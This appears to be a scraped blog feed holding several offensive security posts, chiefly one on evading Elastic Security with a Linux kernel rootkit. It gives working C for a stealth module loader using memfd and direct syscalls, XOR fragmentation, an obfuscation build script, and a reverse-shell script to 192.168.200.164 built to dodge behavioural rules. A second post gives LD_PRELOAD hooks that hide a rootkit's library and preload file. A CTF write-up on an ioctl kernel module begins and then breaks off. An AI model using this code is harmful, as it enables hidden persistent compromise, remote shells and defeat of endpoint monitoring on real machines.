up No single file contains the complete signature pattern Original .ko is deleted after fragmentation memfd is ephemeral and anonymous\nExists for ~15 milliseconds during loading No persistent path in filesystem Difficult to scan in real-time Post-load self-hiding\nModule immediately conceals itself Blocks subsequent inspection attempts Filtering prevents memory analysis Resulting Structure fragments/ ├── chunk_000.bin # XOR-encoded fragment (64KB) ├── chunk_001.bin # XOR-encoded fragment (64KB) ├── chunk_002.bin # XOR-encoded fragment (64KB) ├── ... ├── chunk_N.bin # Final fragment (variable size) ├── metadata.json # Contains XOR key and checksums └── reconstruct.sh # Automated reconstruction script Metadata Format { \u0026#34;original_filename\u0026#34;: \u0026#34;singularity.ko\u0026#34;, \u0026#34;original_size\u0026#34;: 245632, \u0026#34;num_fragments\u0026#34;: 4, \u0026#34;chunk_size\u0026#34;: 65536, \u0026#34;encoded\u0026#34;: true, \u0026#34;xor_key\u0026#34;: \u0026#34;a3f5b2c8e1d4f7a6b9c2e5f8a1d4b7c0\u0026#34;, \u0026#34;checksums\u0026#34;: [ \u0026#34;e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\u0026#34;, \u0026#34;cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce\u0026#34;, \u0026#34;2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae\u0026#34;, \u0026#34;fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9\u0026#34; ] } Custom Loader via memfd_create Instead of using insmod or modprobe, we implement a custom loader that:\nReads encrypted fragments from disk Decodes them in memory Creates an anonymous memory file descriptor Writes the reconstructed module to the memory FD Loads the module via direct syscall Immediately closes the memfd (auto-deleted) Loader Architecture /* * Singularity Loader * * 1. Uses 32-bit syscall (finit_module) via inline assembly * 2. Reconstructs .ko from fragments in memory * 3. Decodes XOR encoding (strings restored to plaintext) * 4. Uses memfd_create for ephemeral loading * 5. Direct syscall to avoid libc wrapper * 6. memfd exists only during loading (~15ms) * * Compile: gcc -o loader loader.c -static * Usage: ./loader fragments/ */ #define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; // Syscall numbers #define __NR_finit_module 313 #define __NR_memfd_create 319 // Settings #define MAX_FRAGMENTS 256 #define MAX_CHUNK_SIZE (1024 * 1024) // 1MB #define XOR_KEY_SIZE 16 #define MODULE_FLAGS 0 Direct Syscall Implementation To avoid EDR hooking of libc functions, we use inline assembly for direct syscalls:\n// Direct 64-bit syscall static inline long syscall_direct_64(long number, long arg1, long arg2, long arg3) { long ret; register long r10 asm(\u0026#34;r10\u0026#34;) = arg3; asm volatile( \u0026#34;syscall\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;D\u0026#34; (arg1), \u0026#34;S\u0026#34; (arg2), \u0026#34;d\u0026#34; (r10) : \u0026#34;rcx\u0026#34;, \u0026#34;r11\u0026#34;, \u0026#34;memory\u0026#34; ); return ret; } // Direct 32-bit syscall static inline long syscall_direct_32(long number, long arg1, long arg2, long arg3) { long ret; asm volatile( \u0026#34;int $0x80\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;b\u0026#34; (arg1), \u0026#34;c\u0026#34; (arg2), \u0026#34;d\u0026#34; (arg3) : \u0026#34;memory\u0026#34; ); return ret; } Why This Works:\n32-bit Syscall: The int $0x80 interface is legacy and less monitored than modern syscall instruction Memory File Descriptor Creation static int create_memfd(const char *name) { long fd = syscall_direct_64(__NR_memfd_create, (long)name, 0, 0); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] memfd_create failed: %s\\n\u0026#34;, strerror(-fd)); return -1; } printf(\u0026#34;[+] memfd created: fd=%ld (%s)\\n\u0026#34;, fd, name); return (int)fd; } memfd_create creates an anonymous file that:\nExists only in memory (tmpfs) Automatically deleted when all file descriptors are closed Can be passed to finit_module() like a regular file Contains plaintext .ko after XOR decode (but only temporarily) Remember that EDRs can monitor memfd_create() calls, and it can also be detected in /proc/\u0026lt;pid\u0026gt;/fd/ during the brief loading window.\nXOR Decoder static void xor_decode(uint8_t *data, size_t len, const uint8_t *key, size_t key_len) { for (size_t i = 0; i \u0026lt; len; i++) { data[i] ^= key[i % key_len]; } } Critical Note: This decode operation restores all strings to plaintext, including \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo;. The evasion relies on the ephemeral nature of this plaintext state, not permanent obfuscation.\nFragment Loading static int load_fragments(const char *dir_path, Fragment *fragments, int *num_fragments) { DIR *dir = opendir(dir_path); if (!dir) { perror(\u0026#34;[!] opendir\u0026#34;); return -1; } struct dirent *entry; int count = 0; printf(\u0026#34;[*] Scanning fragments in: %s\\n\u0026#34;, dir_path); while ((entry = readdir(dir)) != NULL \u0026amp;\u0026amp; count \u0026lt; MAX_FRAGMENTS) { // Look for chunk_XXX.bin if (strncmp(entry-\u0026gt;d_name, \u0026#34;chunk_\u0026#34;, 6) == 0 \u0026amp;\u0026amp; strstr(entry-\u0026gt;d_name, \u0026#34;.bin\u0026#34;) != NULL) { char filepath[512]; snprintf(filepath, sizeof(filepath), \u0026#34;%s/%s\u0026#34;, dir_path, entry-\u0026gt;d_name); // Extract index int idx = atoi(entry-\u0026gt;d_name + 6); // Read fragment FILE *f = fopen(filepath, \u0026#34;rb\u0026#34;); if (!f) { fprintf(stderr, \u0026#34;[!] Error opening %s\\n\u0026#34;, filepath); continue; } fseek(f, 0, SEEK_END); long fsize = ftell(f); fseek(f, 0, SEEK_SET); uint8_t *data = malloc(fsize); if (!data) { fclose(f); continue; } size_t read_bytes = fread(data, 1, fsize, f); fclose(f); if (read_bytes != fsize) { free(data); continue; } fragments[count].data = data; fragments[count].size = fsize; fragments[count].index = idx; count++; printf(\u0026#34;[+] Fragment %d: %s (%ld bytes)\\n\u0026#34;, idx, entry-\u0026gt;d_name, fsize); } } closedir(dir); *num_fragments = count; // Sort fragments by index for (int i = 0; i \u0026lt; count - 1; i++) { for (int j = 0; j \u0026lt; count - i - 1; j++) { if (fragments[j].index \u0026gt; fragments[j + 1].index) { Fragment temp = fragments[j]; fragments[j] = fragments[j + 1]; fragments[j + 1] = temp; } } } return 0; } Module Loading static int load_module_stealthy(int fd, const char *params, int flags) { printf(\u0026#34;[*] Loading module via direct syscall...\\n\u0026#34;); // Try 32-bit syscall first (more stealthy) long ret = syscall_direct_32(__NR_finit_module, fd, (long)params, flags); if (ret \u0026lt; 0) { // Fallback to 64-bit ret = syscall_direct_64(__NR_finit_module, fd, (long)params, flags); } if (ret \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] finit_module failed: %s\\n\u0026#34;, strerror(-ret)); return -1; } printf(\u0026#34;[+] Module loaded successfully!\\n\u0026#34;); return 0; } Complete Loading Workflow int main(int argc, char *argv[]) { // 1. Load fragments Fragment fragments[MAX_FRAGMENTS] = {0}; int num_fragments = 0; load_fragments(fragments_dir, fragments, \u0026amp;num_fragments); // 2. Parse metadata (get XOR key) uint8_t xor_key[XOR_KEY_SIZE] = {0}; int is_encoded = 0; parse_metadata(fragments_dir, xor_key, \u0026amp;is_encoded); // 3. Create memfd (anonymous, temporary) int memfd = create_memfd(\u0026#34;module\u0026#34;); // 4. Reconstruct module in memfd // IMPORTANT: After this step, strings are in PLAINTEXT in memfd for (int i = 0; i \u0026lt; num_fragments; i++) { uint8_t *data = fragments[i].data; size_t size = fragments[i].size; // Decode if necessary (restores plaintext) if (is_encoded) { xor_decode(data, size, xor_key, XOR_KEY_SIZE); } // Write to memfd (plaintext .ko now in memory) write(memfd, data, size); } // Reset FD position lseek(memfd, 0, SEEK_SET); // 5. Load module via direct syscall // Plaintext .ko exists in memfd for ~15ms during this call load_module_stealthy(memfd, module_params, MODULE_FLAGS); // 6. Cleanup (memfd automatically deleted) // After this, the only plaintext copy is in kernel memory // where the rootkit\u0026#39;s self-hiding protects it close(memfd); return 0; } Advantages of This Approach:\nNo .ko file on disk after compilation Fragments can be deleted after loading Plaintext .ko exists only in ephemeral memfd (~15ms window) Post-load self-hiding prevents subsequent analysis Static Analysis Resistance:\nIndividual fragments don\u0026rsquo;t match YARA signatures (XOR\u0026rsquo;ed) No complete ELF structure visible on disk Plaintext reconstruction happens in anonymous, temporary memfd Loaded module immediately hides itself from inspection tools Detection Challenges for EDR:\nMust scan ephemeral memfd in real-time (15ms window) Must bypass rootkit\u0026rsquo;s anti-analysis features post-load Disk-based YARA scanning ineffective against XOR\u0026rsquo;ed fragments Evasion Technique 3: Ftrace Helper Obfuscation The Problem Elastic\u0026rsquo;s rule f07bcabe targets ftrace-based rootkits by detecting function names:\n$str1 = \u0026#34;fh_install_hook\u0026#34; $str2 = \u0026#34;fh_remove_hook\u0026#34; $str3 = \u0026#34;fh_resolve_hook_address\u0026#34; Condition: 2 of them These are standard function names in ftrace hooking frameworks, making them easy signatures.\nThe Solution: Rename Ftrace Framework Functions Our obfuscator treats ftrace helper functions like any other custom function:\nBefore:\n// ftrace/ftrace_helper.c notrace int fh_resolve_hook_address(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int fh_install_hook(struct ftrace_hook *hook) { int err = fh_resolve_hook_address(hook); // ... } notrace void fh_remove_hook(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fh_install_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = fh_install_hook(\u0026amp;hooks[i]); // ... } } notrace void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) fh_remove_hook(\u0026amp;hooks[i]); } Example after Obfuscation:\n// obfuscated/ftrace/ftrace_helper.c notrace int kern_xploqm_helper(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int sys_zmnpqr_ops(struct ftrace_hook *hook) { int err = kern_xploqm_helper(hook); // ... } notrace void net_abqzpx_handler(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fs_klmnop_worker(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = sys_zmnpqr_ops(\u0026amp;hooks[i]); // ... } } notrace void proc_qwerty_entry(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) net_abqzpx_handler(\u0026amp;hooks[i]); } The obfuscated names maintain the ftrace hooking functionality while breaking the specific signature patterns that Elastic Security looks for. The functions remain fully operational since the kernel doesn\u0026rsquo;t care about function names in loaded modules.\nBuild Pipeline: Automated Obfuscation Workflow Our automated build system chains all evasion techniques in a reproducible pipeline:\n#!/bin/bash set -e echo \u0026#34;[*] Singularity Build\u0026#34; rm -rf obfuscated fragments loader singularity_payload* # 1. Obfuscate and compile echo \u0026#34;[1] Obfuscating and compiling...\u0026#34; python3 obfuscator/name_randomizer.py --input . --output obfuscated cd obfuscated \u0026amp;\u0026amp; make \u0026amp;\u0026amp; cd .. # 2. Fragment the .ko echo \u0026#34;[2] Fragmenting module...\u0026#34; python3 obfuscator/ko_fragmenter.py --input obfuscated/singularity.ko --output fragments # 3. CLEANUP - Remove obfuscated directory completely echo \u0026#34;[4] Cleaning build artifacts...\u0026#34; rm -rf obfuscated echo \u0026#34;[+] Build complete! Final files:\u0026#34; echo \u0026#34; - fragments/ (module fragments)\u0026#34; echo \u0026#34; - loader\u0026#34; echo \u0026#34; - NO obfuscated code left behind\u0026#34; Final Test: Successful Evasion In the screenshot we run the build.sh and we can see the saved kernel module fragments and all obfuscated.\nNow, using the loader, we can load Singularity without being detected.\nTesting one of singularity features hiding our process and become root.\nWith these techniques, we successfully bypass Elastic Security\u0026rsquo;s static detection mechanisms.\nBonus: Compilation Path Detection Bypass By default, Elastic Security actively monitors compilation activity in /dev/shm and automatically terminates the process when it detects suspicious operations like compiling loader.c or the Singularity rootkit.\nSimple Evasion Technique:\nThis detection can be easily bypassed by compiling in alternative directories that are less monitored:\n# Instead of /dev/shm (monitored): gcc -o /dev/shm/loader loader.c # Detected and killed # Use alternative paths (less scrutinized): gcc -o /tmp/loader loader.c # Bypasses detection gcc -o /var/tmp/loader loader.c # Bypasses detection Why This Works:\nElastic\u0026rsquo;s behavioral detection rules prioritize monitoring /dev/shm due to its common use in malware. Alternative writable directories like /tmp and /var/tmp receive less aggressive monitoring, allowing the compilation and execution of the loader without triggering automated termination.\nBonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells The latest version of Singularity triggers a reverse shell via ICMP packet hooking. While the previous techniques bypassed static YARA signatures, Elastic\u0026rsquo;s behavioral detection rules caught the reverse shell execution.\nThe Detection Problem Elastic triggered two behavioral alerts:\n\u0026ldquo;Suspicious Execution via setsid and nohup\u0026rdquo; (Risk: 73) \u0026ldquo;Shell Command Execution via Kworker\u0026rdquo; (Risk: 99) Elastic\u0026rsquo;s Behavioral Rules Rule 1: Detects setsid/nohup + /dev/tcp/* patterns\nRule 2: Detects shell processes using /dev/tcp/ or /dev/udp/\nBoth rules automatically kill the process on detection.\nRule 2 Detection Logic:\nprocess where event.action == \u0026#34;exec\u0026#34; and process.name in (\u0026#34;sh\u0026#34;, \u0026#34;bash\u0026#34;, \u0026#34;zsh\u0026#34;, \u0026#34;dash\u0026#34;, \u0026#34;zmodload\u0026#34;) and process.command_line like~ (\u0026#34;*/dev/tcp/*\u0026#34;, \u0026#34;*/dev/udp/*\u0026#34;, \u0026#34;*zsh/net/tcp*\u0026#34;, \u0026#34;*zsh/net/udp*\u0026#34;) The rule scans the entire command line for /dev/tcp/ patterns, making simple obfuscation ineffective.\nOriginal Detected Code // DETECTED by Elastic snprintf(cmd, sizeof(cmd), \u0026#34;bash -c \u0026#39;\u0026#34; \u0026#34;PID=$$; \u0026#34; \u0026#34;kill -59 $PID; \u0026#34; \u0026#34;exec -a \\\u0026#34;%s\\\u0026#34; /bin/bash \u0026amp;\u0026gt;/dev/tcp/%s/%s 0\u0026gt;\u0026amp;1\u0026#34; \u0026#34;\u0026#39; \u0026amp;\u0026#34;, PROC_NAME, YOUR_SRV_IP, SRV_PORT); char *argv[] = {\u0026#34;/usr/bin/setsid\u0026#34;, \u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, cmd, NULL}; Why detected:\nUses setsid command /dev/tcp/ appears in process arguments Shell spawned from kernel worker context Working Evasion: Staged Script Execution The solution is to separate the malicious payload from process arguments by writing the script to disk first, then executing it.\nKey Changes 1. Write the script to disk:\n#define SCRIPT_PATH \u0026#34;/singularity\u0026#34; // Hide kworker immediately add_hidden_pid(current-\u0026gt;pid); // Create script with automatic process hiding snprintf(script, sizeof(script), \u0026#34;#!/bin/bash\\n\u0026#34; \u0026#34;exec 196\u0026lt;\u0026gt;/dev/tcp/%s/%s\\n\u0026#34; \u0026#34;sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp;\\n\u0026#34; \u0026#34;SHELL_PID=$!\\n\u0026#34; \u0026#34;sleep 1\\n\u0026#34; \u0026#34;kill -59 $SHELL_PID\\n\u0026#34; \u0026#34;kill -59 $$\\n\u0026#34;, YOUR_SRV_IP, SRV_PORT); f = filp_open(SCRIPT_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755); kernel_write(f, script, strlen(script), \u0026amp;pos); 2. Execute with clean command line:\nchar *argv[] = {\u0026#34;/bin/bash\u0026#34;, SCRIPT_PATH, NULL}; call_usermodehelper_exec(sub_info, UMH_WAIT_PROC); How It Works Step 1: The rootkit immediately hides the kworker thread executing the payload using add_hidden_pid(current-\u0026gt;pid), making the entire process chain invisible from the start.\nStep 2: It writes /singularity containing:\n#!/bin/bash exec 196\u0026lt;\u0026gt;/dev/tcp/192.168.200.164/8081 sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp; SHELL_PID=$! sleep 1 kill -59 $SHELL_PID kill -59 $$ The script:\nOpens TCP connection on file descriptor 196 Spawns reverse shell (sh) in background using that connection Captures the specific PID of the spawned shell: SHELL_PID=$! Waits 1 second for connection to establish Runs kill -59 $SHELL_PID to hide only the reverse shell process Runs kill -59 $$ to hide the parent bash script This approach only hides the specific processes created by the script, avoiding interference with legitimate system sh processes.\nStep 3: Execute the script. Elastic sees only:\n/bin/bash /singularity No /dev/tcp/ in the command line - detection bypassed.\nStep 4: Inside the script, automatic hiding occurs:\nReverse shell spawns in background Script captures the exact PID using $! variable Waits 1 second for connection to establish kill -59 $SHELL_PID hides only the spawned reverse shell kill -59 $$ hides the parent bash script Only the specific processes created by the rootkit are hidden, leaving legitimate system processes untouched.\nResult No behavioral alerts triggered\nReverse shell establishes successfully\nProcesses completely invisible to monitoring tools\nRoot privileges granted automatically\nElastic\u0026rsquo;s behavioral rules scan entire command lines for patterns like /dev/tcp/. By writing the payload to a script file first and executing it with a clean command line, we bypass detection while maintaining full functionality. The rootkit\u0026rsquo;s kill -59 signal automatically handles privilege escalation and process hiding.\nConclusion This research demonstrates techniques to evade Elastic Security\u0026rsquo;s static YARA signatures and behavioral detection rules through:\nStatic Signature Evasion: Symbol randomization, module fragmentation with XOR encoding for disk-based evasion Behavioral Detection Evasion: Staged script execution and process hiding via rootkit hooks These techniques highlight the ongoing cat-and-mouse game between offensive and defensive security. While effective against current detection rules, EDR vendors continuously update their signatures and behavioral analytics.\nKey Takeaways:\nSymbol Randomization breaks function name patterns in YARA rules Module Fragmentation + XOR Encoding defeats disk-based static binary analysis Ephemeral memfd Loading creates a narrow detection window (~15ms) for plaintext module Post-Load Self-Hiding prevents subsequent memory analysis of loaded module Ftrace Helper Obfuscation hides hooking framework signatures Staged Script Execution bypasses command-line behavioral detection Direct Syscalls avoid userland EDR hooks Understanding the Evasion:\nThe success of this approach relies on understanding where and when EDR tools scan:\nDisk scanning is defeated by XOR-encoded fragments Real-time memory scanning is challenged by ephemeral memfd (15ms window) Post-load analysis is blocked by rootkit self-hiding features This layered defense-in-depth approach creates multiple barriers that must all be overcome simultaneously for detection to succeed.\nIf you\u0026rsquo;ve read this far, thank you for your time! Contact me via X (@MatheuzSecurity) or Discord (kprobe) for questions.\n","permalink":"http://localhost:1313/hacking/bypassing-elastic/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://giffiles.alphacoders.com/223/223415.gif\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eSecurity solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\u003c/p\u003e\n\u003cp\u003eThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\u003c/p\u003e","title":"Evading Elastic Security: Linux Rootkit Detection Bypass"},{"content":"Hello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is LD_PRELOAD Rootkit? Before we begin, we need to understand what an LD_PRELOAD rootkit is.\nIs a type of malware that uses the LD_PRELOAD environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel. Introduction A good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\nHowever a weak point in them is that for those who have created or know about LD_PRELOAD rootkits, you know that they are easy to detect and remove.\nAnd in this post, in addition to learning some techniques to detect an LD_PRELOAD rootkit, we will learn how to hide it, to prevent these detections mentioned in the post from catching it.\nDetecting LD_PRELOAD rootkit Most of the time LD_PRELOAD rootkits can be detected using ldd /bin/ls, like this:\nldd: Provides a list of the dynamic dependencies that a given program needs. It will return the name of the shared library and its location. They can also be found in /proc/[pid]/maps.\n/proc/[pid]/maps: A file containing the currently mapped memory regions and their access permissions. They can also be easily found in /proc/[pid]/map_files/\n/proc/[pid]/map_files/: Shows memory-mapped files. And of course, what you can\u0026rsquo;t miss is checking /etc/ld.so.preload\n/etc/ld.so.preload: File containing a separate list of shared objects to be loaded before the program. You can also check this using lsof.\nlsof: Lists files opened by processes and used with -p , it shows the shared libraries loaded by a specific process. And these are the main ways to detect a shared object, you saw how easy it is, right? And most of the LD_PRELOAD rootkits that I see, do not have a feature to hide from it, and as I am a very curious person, I decided to learn some ways on how to hide it and it is in the next session that we will learn.\nHiding an LD_PRELOAD Rootkit from ldd and /proc I think that for people who know me, they know that I really like hooking the read, and this case will be no different.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*real_read)(int, void *, size_t) = NULL; if (!real_read) { real_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); if (!real_read) { errno = ENOSYS; return -1; } } ssize_t result = real_read(fd, buf, count); if (result \u0026gt; 0) { char *start = (char *)buf; char *end = start + result; char *current = start; size_t new_buf_size = result; char *new_buf = (char *)malloc(new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } size_t new_buf_pos = 0; while (current \u0026lt; end) { char *line_start = current; char *line_end = memchr(current, \u0026#39;\\n\u0026#39;, end - current); if (!line_end) { line_end = end; } else { line_end++; } if (!memmem(line_start, line_end - line_start, \u0026#34;hook.so\u0026#34;, strlen(\u0026#34;hook.so\u0026#34;))) { size_t line_length = line_end - line_start; if (new_buf_pos + line_length \u0026gt; new_buf_size) { new_buf_size = new_buf_pos + line_length; new_buf = (char *)realloc(new_buf, new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } } memcpy(new_buf + new_buf_pos, line_start, line_length); new_buf_pos += line_length; } current = line_end; } memcpy(buf, new_buf, new_buf_pos); result = new_buf_pos; free(new_buf); } return result; } This code implements a hook in the read function, intercepting file readings and filtering lines that contain the string \u0026quot;hook.so\u0026quot;, using the dlsym function to obtain the original version of read, processing the data read, dynamically allocating memory to store the filtered result and returning this new buffer, while ensuring that any line with \u0026quot;hook.so\u0026quot; is deleted through functions like memm and memchr, effectively \u0026ldquo;hiding\u0026rdquo; the string by copying only the lines that don\u0026rsquo;t contain it to the final buffer.\nTherefore, it is not detected in ldd and by any file/directory in /proc/*.\nExample using ldd:\nExample using /proc/pid/maps:\nExample using /proc/pid/map_files/:\nExample using lsof:\nExample using cat /etc/ld.so.preload:\nThis is a simple solution, nothing too advanced, but it is quite effective.\nHiding from /etc/ld.so.preload As seen previously, the presented technique works, however, if you do cat /etc/ld.so.preload, as expected hook.so will not appear, however, if you use nano, for example, it will be seen there.\nAnd that\u0026rsquo;s bad for us.\nTo do this, we will hook the fopen, read and readdir functions to hide the file /etc/ld.so.preload, making it \u0026ldquo;impossible\u0026rdquo; to open, read or list in directories, and also causing it to be non-existent, for example, if you do a cat /etc/ld.so.preload, it returns No such file or directory.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;limits.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #define HIDDEN_FILE \u0026#34;/etc/ld.so.preload\u0026#34; FILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) { orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); } if (strcmp(pathname, HIDDEN_FILE) == 0) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*orig_read)(int, void *, size_t) = NULL; if (!orig_read) { orig_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); } char path[PATH_MAX]; snprintf(path, sizeof(path), \u0026#34;/proc/self/fd/%d\u0026#34;, fd); char actual_path[PATH_MAX]; ssize_t len = readlink(path, actual_path, sizeof(actual_path) - 1); if (len \u0026gt; 0) { actual_path[len] = \u0026#39;\\0\u0026#39;; if (strcmp(actual_path, HIDDEN_FILE) == 0) { errno = ENOENT; return -1; } } return orig_read(fd, buf, count); } struct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) { orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); } struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, \u0026#34;ld.so.preload\u0026#34;) != 0) { return entry; } } return NULL; } fopen: This function checks if the file is /etc/ld.so.preload, if so, prevents it from opening by returning NULL and setting the error to ENOENT (No such file or directory), otherwise, it calls the function fopen original to open other files normally. read: Before reading, the function checks whether the file associated with the fd (file descriptor) is /etc/ld.so.preload (using readlink to obtain the actual path of the file), if so, a error on the read, returning -1 and setting the error to ENOENT, otherwise it calls the original read function to read other files normally. readdir: This function reads directory entries and checks if the name of any entry is ld.so.preload, if it finds that name, it ignores the entry and continues the search, otherwise it returns the entry normally, that is, it becomes invisible if you try to read ls -lah /etc/ |grep ld.so.preload. And then, it becomes more \u0026ldquo;stealth\u0026rdquo;.\nChecking if ld.so.preload is listed in /etc/:\nChecking if you can see the contents of /etc/ld.so.preload:\nAnd of course this isn\u0026rsquo;t 100% perfect, but it\u0026rsquo;s cool to understand how this process works.\nPlot Twist Well\u0026hellip; here\u0026rsquo;s a very funny thing, the process of hiding /etc/ld.so.preload, presented in the post becomes useless when we use strace 😂.\nStrace: Diagnostic, debugging and instructional userspace utility for Linux. This does not work against strace, our code cannot hide from it, because it only handles the read function, while strace can also monitor system calls at the kernel level, where the hook.so is still visible.\nFinal consideration I hope you liked this post, and that you learned something from it, if you have any questions, please contact me on Twitter.\n","permalink":"http://localhost:1313/hacking/ldpreload-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ld_preload-rootkit\"\u003eWhat is LD_PRELOAD Rootkit?\u003c/h2\u003e\n\u003cp\u003eBefore we begin, we need to understand what an \u003ccode\u003eLD_PRELOAD rootkit\u003c/code\u003e is.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIs a type of malware that uses the \u003ccode\u003eLD_PRELOAD\u003c/code\u003e environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eA good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\u003c/p\u003e","title":"How detect a LD_PRELOAD rootkit and hide from ldd \u0026 /proc"},{"content":" Challenge Description In this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\nWhat we have:\nA hidden kernel module loaded at boot Character device at /dev/ioctl_dev Setup script (device.sh) that loads the module and shreds source files SSH access enabled (username: root, password: ioctl) Important Note: Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, SSH is enabled for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\nGetting Started - VM Access \u0026amp; SSH When you boot the VM, you\u0026rsquo;ll see the login screen. The credentials are straightforward:\nUsername: root Password: ioctl Setting Up SSH Access After logging in, the first thing you should do is check the VM\u0026rsquo;s IP address to enable SSH access. This makes the challenge much more comfortable as you can:\nCopy and paste code easily Use multiple terminal windows Access from your preferred terminal emulator Run ip a to get the network configuration:\nAs we can see, the VM has IP 192.168.200.165. Now we can SSH from our host machine:\nssh root@192.168.200.165 Initial Reconnaissance Now that we\u0026rsquo;re comfortably connected via SSH, let\u0026rsquo;s explore what we have on the system.\nChecking for the Device The challenge mentions a device at /dev/ioctl_dev. Let\u0026rsquo;s verify it exists:\nroot@hunter:~# ls -lah 